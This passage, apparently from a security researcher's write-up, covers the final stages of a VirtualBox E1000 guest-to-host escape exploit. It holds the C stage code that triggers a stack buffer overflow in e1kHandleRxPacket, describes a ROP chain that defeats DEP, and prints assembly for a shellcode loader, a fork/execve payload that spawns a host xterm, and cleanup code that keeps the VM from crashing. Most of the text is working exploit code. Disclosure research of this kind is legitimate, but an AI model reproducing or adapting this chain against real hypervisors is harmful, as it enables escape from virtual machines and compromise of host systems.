It has been said that in order for the integer underflow not to lead to the stack buffer overflow, certain E1000 registers should been configured. The idea is that the buffer is being overflowed in e1kHandleRxPacket function which is called while handling Tx descriptors in the loopback mode. Indeed, in the loopback mode the guest sends network packets to itself so they are received right after being sent. We disable this mode so e1kHandleRxPacket is unreachable.

### DEP Bypass
We have bypassed ASLR. Now the loopback mode can be enabled and the stack buffer overflow can be triggered.

```c
void stage_2_overflow_heap_and_stack_buffers(void* mmio, void* tx_ring, uint64_t vboxdd_base) {
    off_t buffer_pa;
    void* buffer_va;
    alloc_buffer(&buffer_pa, &buffer_va);

    stage_2_set_up_buffer(buffer_va, vboxdd_base);
    stage_2_trigger_overflow(mmio, tx_ring, buffer_pa);

    free_buffer(buffer_va);
}

void stage_2_main(void* mmio, void* tx_ring, uint64_t vboxdd_base) {
    printk(KERN_INFO PFX"##### Stage 2 #####\n");

    e1000_enable_loopback_mode(mmio);
    stage_2_overflow_heap_and_stack_buffers(mmio, tx_ring, vboxdd_base);
    e1000_disable_loopback_mode(mmio);
}
```

For now, when the last instruction of e1kHandleRxPacket is executed the saved return address is overwritten and control is transferred anywhere the attacker wants. But DEP is still there. It is bypassed in a classical way of building a ROP chain. ROP gadgets allocate executable memory, copy a shellcode loader into and execute it.

### Shellcode
The shellcode loader is trivial. It copies the beginning of the overflowing buffer next to it.

```asm
use64

start:
    lea rsi, [rsp - 0x4170];
    push rax
    pop rdi
    add rdi, loader_size
    mov rcx, 0x800
    rep movsb
    nop

payload:
    ; Here the shellcode is to be

loader_size = $ - start
```

The shellcode is executed. Its first part is:

```asm
use64

start:
    ; sys_fork
    mov rax, 58
    syscall

    test rax, rax
    jnz continue_process_execution

    ; Initialize argv
    lea rsi, [cmd]
    mov [argv], rsi

    ; Initialize envp
    lea rsi, [env]
    mov [envp], rsi

    ; sys_execve
    lea rdi, [cmd]
    lea rsi, [argv]
    lea rdx, [envp]
    mov rax, 59
    syscall

...

cmd     db '/usr/bin/xterm', 0
env     db 'DISPLAY=:0.0', 0
argv    dq 0, 0
envp    dq 0, 0
```

It does fork and execve to create /usr/bin/xterm process. The attacker gains control over the host's ring 3.

### Process Continuation
I believe every exploit should be finished. It means it should not crash an application, though it's not always possible, of course. We need the virtual machine to continue execution which is achieved by the second part of shellcode.

```asm
continue_process_execution:
    ; Restore RBP
    mov rbp, rsp
    add rbp, 0x48

    ; Skip junk
    add rsp, 0x10

    ; Restore the registers that must be preserved according to System V ABI
    pop rbx
    pop r12
    pop r13
    pop r14
    pop r15

    ; Skip junk
    add rsp, 0x8

    ; Fix the linked list of PDMQUEUE to prevent segfaults on VM shutdown
    ; Before:   "E1000-Xmit" -> "E1000-Rcv" -> "Mouse_1" -> NULL
    ; After:    "E1000-Xmit" -> NULL

    ; Zero out the entire PDMQUEUE "Mouse_1" pointed by "E1000-Rcv"
    ; This was unnecessary on my testing machines but to be sure...
    mov rdi, [rbx]
    mov rax, 0x0
    mov rcx, 0xA0
    rep stosb

    ; NULL out a pointer to PDMQUEUE "E1000-Rcv" stored in "E1000-Xmit"
    ; because the first 8 bytes of "E1000-Rcv" (a pointer to "Mouse_1") 
    ; will be corrupted in MMHyperFree
    mov qword [rbx], 0x0

    ; Now the last PDMQUEUE is "E1000-Xmit" which will not be corrupted

    ret
```

When e1kHandleRxPacket is called a callstack is:

```
#0 e1kHandleRxPacket
#1 e1kTransmitFrame
#2 e1kXmitDesc
#3 e1kXmitPacket
#4 e1kXmitPending
#5 e1kR3NetworkDown_XmitPending
...
```

We'll jump right to e1kR3NetworkDown_XmitPending which does nothing more and returns to a hypervisor function.

```c
static DECLCALLBACK(void) e1kR3NetworkDown_XmitPending(PPDMINETWORKDOWN pInterface)
{
    PE1KSTATE pThis = RT_FROM_MEMBER(pInterface, E1KSTATE, INetworkDown);
    /* Resume suspended transmission */
    STATUS &= ~STATUS_TXOFF;
    e1kXmitPending(pThis, true /*fOnWorkerThread*/);
}
```

The shellcode adds 0x48 to RBP to make it as it should be in e1kR3NetworkDown_XmitPending. Next, the registers RBX, R12, R13, R14, R15 are taken from stack because it's required by System V ABI to preserve it in a callee function. If they aren't the hypervisor will crash because of invalid pointers in them.

It could be enough because the virtual machine isn't crashes anymore and continues execute. But there will an access violation in PDMR3QueueDestroyDevice function when the VM is shutdown. The reason is that when the heap is overflowed an important structure PDMQUEUE is overwritten. Furthermore, it's overwritten by the last two ROP gadgets i.e. the last 16 bytes. I tried to reduce the ROP chain size and failed, but when I replaced the data manually the hypervisor was still crashing. It meant the obstacle is not as obvious as seemed.

Data structure being overwritten is a linked list. Data to be overwritten is in the last second list element; a next pointer is to be overwritten. The remedy turned out to be simple:

```
; Fix the linked list of PDMQUEUE to prevent segfaults on VM shutdown
; Before:   "E1000-Xmit" -> "E1000-Rcv" -> "Mouse_1" -> NULL
; After:    "E1000-Xmit" -> NULL
```

Getting rid of the last two elements allows the virtual machine to shut down smoothly.

## Demo
https://vimeo.com/299325088
